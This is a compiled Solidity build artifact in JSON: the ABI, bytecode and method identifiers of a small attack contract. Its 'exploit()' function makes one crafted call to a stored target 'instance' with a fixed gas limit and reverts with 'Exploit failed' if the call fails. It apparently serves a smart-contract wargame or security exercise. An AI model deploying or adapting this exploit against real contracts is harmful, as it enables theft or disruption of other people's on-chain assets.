{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x60a060405234801561001057600080fd5b506040516102d73803806102d78339818101604052602081101561003357600080fd5b5051606081901b6001600160601b0319166080526001600160a01b031661026d61006a600039806078528060f2525061026d6000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063022ec0951461003b57806363d9b7701461006c575b600080fd5b610043610076565b6040805173ffffffffffffffffffffffffffffffffffffffff9092168252519081900360200190f35b61007461009a565b005b7f000000000000000000000000000000000000000000000000000000000000000081565b606063ab3bfe6a60e01b60405160200180827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916815260040180610100815250602001915050604051602081830303815290604052905060007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16620186a0836040518082805190602001908083835b6020831061015b5780518252601f19909201916020918201910161013c565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038160008787f1925050503d80600081146101be576040519150601f19603f3d011682016040523d82523d6000602084013e6101c3565b606091505b505090508061023357604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600e60248201527f4578706c6f6974206661696c6564000000000000000000000000000000000000604482015290519081900360640190fd5b505056fea264697066735822122040d002420ef658559d761c29e6fa06981051e5e2e6a164c796b46493c660adca64736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"exploit()":"63d9b770","instance()":"022ec095"},"id":0}